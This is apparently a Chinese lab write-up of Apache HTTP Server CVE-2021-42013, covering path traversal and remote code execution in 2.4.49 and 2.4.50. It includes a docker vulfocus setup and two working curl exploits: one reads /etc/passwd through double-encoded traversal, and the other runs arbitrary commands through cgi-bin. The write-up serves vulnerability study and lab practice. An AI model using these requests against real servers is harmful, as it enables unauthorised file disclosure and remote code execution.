# 前言
## 漏洞原理
该漏洞是由于在Apache HTTP Server 2.4.50版本中对CVE-2021-41773修复不够完善，攻击者可利用该漏洞绕过修复补丁，并利用目录穿越攻击访问服务器中一些文件，进而造成敏感信息泄露。若httpd中开启CGI功能，攻击者可以构造恶意请求，造成远程代码执行。

## 影响版本
Apache HTTP Server 2.4.50
Apache HTTP Server 2.4.49

## 漏洞信息
漏洞名称	路径穿越与命令执行漏洞
漏洞编号	CVE-2021-42013
危害等级	超危
CVSS评分	9.8
漏洞类型	路径漏洞
查询地址：http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202110-413

# 环境搭建
docker pull vulfocus/apache-cve_2021_42013:latest #拉取靶场
docker images #查看镜像
docker run -d -P vulfocus/apache-cve_2021_42013 #启动镜像
docker ps #查看映射的端口
![1](https://img-blog.csdnimg.cn/3ad305ddbd5a4dc3b1a9bdef081a152e.png)
![2](https://img-blog.csdnimg.cn/c5839d17c6e343859bf699f1df5a03ec.png)
![3](https://img-blog.csdnimg.cn/030557360ea04a56a61e852c3b737192.png)
![4](https://img-blog.csdnimg.cn/49293860d6c44251a794f60387287156.png)
![5](https://img-blog.csdnimg.cn/ea23feb27c7c48339f7344c409d4f21e.png)
# 漏洞利用
在kali上执行EXP
```php
curl -v --path-as-is http://ip:port/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```
![6](https://img-blog.csdnimg.cn/d729ddf2dfbf4f1e8520f76f03df501e.png)
在服务器上启用 mods cgi 或 cgid 后，此路径遍历漏洞将允许任意命令执行：

```php
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "vulfocus.fofa.so:$1/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
```
$1:开放端口 $2:路径 $3:命令

在服务端开启了gi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意cg命令：![7](https://img-blog.csdnimg.cn/8492fea56d4e446cbe0388585979b21a.png)
# 修复方法
升级到Apache HTTP Server安全版本。